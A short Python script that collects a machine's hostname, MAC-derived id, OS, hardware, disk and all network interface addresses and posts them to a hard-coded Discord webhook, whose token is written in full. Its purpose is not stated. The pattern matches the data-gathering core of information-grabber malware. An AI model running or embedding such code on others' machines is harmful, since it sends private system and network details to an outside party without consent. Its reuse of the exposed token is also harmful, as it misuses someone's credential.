import platform
import psutil
import uuid
import socket
import json
import requests
from datetime import datetime


def get_machine_id():
    return hex(uuid.getnode())


def get_system_info():
    uname = platform.uname()

    return {
        "hostname": socket.gethostname(),
        "machine_id": get_machine_id(),

        "os": {
            "system": uname.system,
            "release": uname.release,
            "version": uname.version,
            "architecture": uname.machine
        },

        "cpu": {
            "physical_cores": psutil.cpu_count(logical=False),
            "logical_cores": psutil.cpu_count(logical=True),
            "max_frequency_mhz": psutil.cpu_freq().max if psutil.cpu_freq() else None,
            "current_frequency_mhz": psutil.cpu_freq().current if psutil.cpu_freq() else None
        },

        "memory": {
            "total_gb": round(psutil.virtual_memory().total / (1024 ** 3), 2),
            "available_gb": round(psutil.virtual_memory().available / (1024 ** 3), 2),
            "used_percent": psutil.virtual_memory().percent
        },

        "disk": {
            "total_gb": round(psutil.disk_usage("/").total / (1024 ** 3), 2),
            "used_gb": round(psutil.disk_usage("/").used / (1024 ** 3), 2),
            "free_gb": round(psutil.disk_usage("/").free / (1024 ** 3), 2)
        },

        "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat(),
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }


def get_network_info():
    interfaces = {}

    for iface, addrs in psutil.net_if_addrs().items():
        interfaces[iface] = []
        for addr in addrs:
            interfaces[iface].append({
                "family": str(addr.family),
                "address": addr.address
            })

    return {
        "interfaces": interfaces
    }


def format_message(data):
    msg = "🖥️ **PC Information**\n\n"
    msg += "```json\n"
    msg += json.dumps(data, indent=2)
    msg += "\n```"
    return msg


def do_discord():
    system_info = get_system_info()
    network_info = get_network_info()

    payload = {
        **system_info,
        **network_info
    }

    msg = format_message(payload)

    WEBHOOK_URL = "https://discord.com/api/webhooks/1554142083923579018/voep3WLi_Q5cZcQzGsO8yTeX-AFhMc7C-Z_VeHbznyZOMAQQENfEdYe8tr3u-tW9TssV"

    r = requests.post(
        WEBHOOK_URL,
        json={
            "content": msg
        },
        timeout=10
    )

    return r.status_code == 204 or r.status_code == 200
